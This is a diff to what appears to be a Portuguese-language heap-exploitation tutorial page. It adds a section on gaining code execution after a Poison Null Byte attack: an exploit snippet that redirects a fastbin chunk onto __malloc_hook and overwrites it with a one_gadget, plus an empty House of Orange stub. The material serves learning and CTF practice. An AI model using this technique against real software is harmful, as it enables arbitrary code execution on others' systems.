@@ -153,7 +153,12 @@
 <li><a href="#full">Full</a></li>
 </ul>
 </li>
-<li><a href="#exec">Exec</a></li>
+<li><a href="#exec">Exec</a>
+<ul>
+<li><a href="#fastbin">Fastbin</a></li>
+<li><a href="#house-of-orange">House of Orange</a></li>
+</ul>
+</li>
 </ul>
 <p>Essa tecnica se parece com a House of Einherjar, porem nela nos 
 precisávamos usar null bytes no <code>prev_size</code> e dado que overflows 
@@ -577,6 +582,44 @@ libc.address = libc_leak - libc.sym.main_arena - 88
 #log.success(&quot;Heap: &quot;+hex(heap_leak))
 </code></pre>
 <h1 id="exec"><a class="header" href="#exec">Exec</a></h1>
+<h2 id="fastbin"><a class="header" href="#fastbin">Fastbin</a></h2>
+<p>Para conseguir execução, costuma-se apos os infoleaks, usar 
+<code>find_fake_fast</code> no pwntools no <code>__malloc_hook</code> e corrompe-lo com 
+um one gadget... como se fosse um fastbin dup</p>
+<p>Normalmente, sera um chunk 0x70</p>
+<pre><code class="language-py"># Google Poison Null
+  - sem alterações
+
+# Info leaks
+  - sem alterações
+
+# Exec: fastbin
+
+chunk_A = malloc(0x88) # Pegar o chunk_A de volta para ele nao atrapalhar 
+chunk_fast = malloc(0x68) # 0x70 fastbin: overlap chunk_B2
+
+free(chunk_fast)
+edit(chunk_B2, p64(libc.sym.__malloc_hook - 35)) # find_fake_fast
+
+chunk_fast = malloc(0x68) # consumir
+chunk_hook = malloc(0x68) # __malloc_hook
+
+edit(chunk_hook, b&quot;\x00&quot;*19 + p64(ONE_GADGET))
+
+malloc() # ativar o one_gadget
+</code></pre>
+<h2 id="house-of-orange"><a class="header" href="#house-of-orange">House of Orange</a></h2>
+<p>Apesar de mais complicado e menos confiável 
+(somente funciona 50% das vezes), voce também pode usa-la!</p>
+<pre><code class="language-py"># Google Poison Null
+  - sem alterações
+
+# Info leaks
+  - sem alterações
+
+# Exec: House of Orange
+
+</code></pre>
 
                     </main>
 
